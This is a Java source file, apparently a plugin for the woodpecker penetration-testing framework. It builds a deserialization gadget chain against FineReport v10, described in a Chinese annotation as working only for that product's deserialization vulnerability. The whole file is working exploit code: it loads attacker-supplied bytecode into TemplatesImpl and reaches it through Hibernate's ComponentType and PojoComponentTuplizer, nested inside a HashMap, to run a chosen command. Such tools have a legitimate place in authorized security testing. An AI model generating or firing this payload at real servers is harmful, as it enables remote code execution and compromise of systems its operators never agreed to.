package me.gv7.woodpecker.plugin.gadgets.exec;
import com.fr.third.org.hibernate.engine.spi.TypedValue;
import com.fr.third.org.hibernate.type.ComponentType;
import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import me.gv7.woodpecker.plugin.annotation.Description;
import me.gv7.woodpecker.plugin.annotation.RequireParameter;
import me.gv7.woodpecker.plugin.core.pojo.Input;
import me.gv7.woodpecker.plugin.gadgets.CustomPayload;
import me.gv7.woodpecker.plugin.gadgets.ObjectPayload;
import sun.reflect.ReflectionFactory;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

import static me.gv7.woodpecker.plugin.gadgets.util.Reflections.setFieldValue;

@Description("仅适用于帆软v10反序列化漏洞！")
@RequireParameter("Command")
public class Hibernate_fr implements CustomPayload {
    @Override
    public  Object getObject(final Input input) throws Exception{
        TemplatesImpl obj=new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{input.getBytecode()});
        setFieldValue(obj,"_name","HelloT");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        Class clazz = Class.forName("com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer");
        Constructor constructor = Object.class.getDeclaredConstructor();
        Permit.setAccessible(constructor);
        Constructor pojoct = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz, constructor);
        Permit.setAccessible(pojoct);
        Object pojoCT = pojoct.newInstance();

        Class clazz1 = Class.forName("com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer");
        Class clazz4 = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor constructor4 = clazz4.getDeclaredConstructor(Class.class, String.class, Method.class);
        Object getter = constructor4.newInstance(obj.getClass(), "outputProperties", obj.getClass().getMethod("getOutputProperties"));
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        Field f = clazz1.getDeclaredField("getters");
        f.setAccessible(true);
        f.set(pojoCT, getters);

        Class clazz3 = Class.forName("com.fr.third.org.hibernate.type.ComponentType");
        Constructor constructor2 = Object.class.getDeclaredConstructor();
        Permit.setAccessible(constructor2);
        Constructor constructor3 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz3, constructor2);
        ComponentType componentType = (ComponentType) constructor3.newInstance();
        TypedValue typedValue = new TypedValue(componentType, null);
        setFieldValue(componentType, "componentTuplizer", pojoCT);
        setFieldValue(componentType, "propertySpan", 1);

        HashMap<Object, String> map = new HashMap<>();
        map.put(typedValue, "1jzz");
        //Object template = Gadgets.createTemplatesImpl("TomcatEcho");
        setFieldValue(typedValue, "value", obj);
        return map;
    }

}
